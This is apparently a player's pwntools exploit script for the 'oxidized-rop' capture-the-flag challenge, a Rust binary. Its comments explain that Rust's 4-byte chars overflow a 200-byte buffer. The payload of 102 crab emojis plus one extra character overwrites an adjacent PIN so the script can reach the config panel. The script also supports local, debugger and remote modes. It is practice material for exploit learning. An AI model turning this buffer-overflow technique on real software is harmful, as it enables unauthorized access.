#!/usr/bin/env python3

from pwn import *

e = ELF("./oxidized-rop_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        # b *'oxidized_rop::present_survey'+478
        # b *'oxidized_rop::save_data'+0xe3
        r = gdb.debug([e.path], '''
                      b *'oxidized_rop::save_data'+0xe3
                      b oxidized_rop::present_config_panel
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # In Rust, a char is always a UTF-8 char and Rust always uses 4 bytes for a char.
    # So copying 200 chars is actually copying 200 * 4 = 800 bytes.
    # But the code, the buffer to write is allocated as [0_u8; INPUT_SIZE], which is 200-byte long.
    # So we can overwrite the pin variable right after.

    # The PIE is enabled and there is no useful @plt functions. Didn't find a way to use ROP.
    # The challenge's name misleaded me :). Bad bad author.

    # pause()
    r.sendlineafter('Selection:', b'1')
    payload = flat(
            "🦀".encode('utf-8') * 102,
            chr(123456).encode('utf-8'),
            )
    r.sendlineafter('):', payload)

    r.sendlineafter('Selection:', b'2')

    r.interactive()

if __name__ == "__main__":
    main()
